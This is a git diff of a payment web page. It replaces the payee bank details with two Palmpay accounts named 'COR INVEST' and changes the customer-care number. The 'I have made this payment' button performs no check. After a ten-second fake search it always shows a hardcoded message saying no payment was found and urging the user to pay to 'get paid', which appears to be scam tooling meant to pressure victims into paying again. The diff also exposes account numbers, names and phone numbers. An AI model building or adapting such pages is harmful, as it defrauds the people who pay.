@@ -21,15 +21,29 @@
        <div class="border">
         <div class="num">
             <h3>Bank Name</h3>
-            <h3>Gtbank</h3>
+            <h3>Palmpay</h3>
         </div>
         <div class="num">
             <h3>Account Number</h3>
-            <h3>0804071573 </h3>
+            <h3>8120402689 </h3>
         </div>
         <div class="num">
             <h3>Account Name</h3>
-            <h3>Josiah Aimtoget</h3>
+            <h3>COR INVEST</h3>
+        </div>
+       </div>
+        <div class="border">
+        <div class="num">
+            <h3>Bank Name</h3>
+            <h3>Palmpay </h3>
+        </div>
+        <div class="num">
+            <h3>Account Number</h3>
+            <h3>8160705552 </h3>
+        </div>
+        <div class="num">
+            <h3>Account Name</h3>
+            <h3>COR INVEST</h3>
         </div>
        </div>
        <h6>Click this button below 👇after your successful payment...</h6>
@@ -37,8 +51,8 @@
         <button onclick="errorButton()"> I have made this payment</button>
        <div class="footer">
           <h3>Call customer care</h3>
-        <a href="tel:+2348088886823">
-          +2348088886823
+        <a href="tel:+2347019085739">
+          +2347019085739
         </a>
        </div><br>
        </div>
@@ -62,7 +76,7 @@
             // Simulate the search process with a setTimeout
             setTimeout(() => {
               // Replace this with your actual search logic
-             const results = ['Payment successful'];
+             const results = ['Sorry Dear User no any payment Was found from Your bank account Kindly Make a payment and Get paid Right now'];
               resolve(results);
             }, 10000); // Simulating a 2-second search process
           });
@@ -73,8 +87,8 @@
           const searchResult = result.value;
           // You can display or process the search results here
           Swal.fire({
-            icon: 'success',
-            title: 'Congratulations',
+            icon: 'error',
+            title: 'Result',
             html: `${searchResult.map((item) => `${item}`).join('')}`,
           });
         }
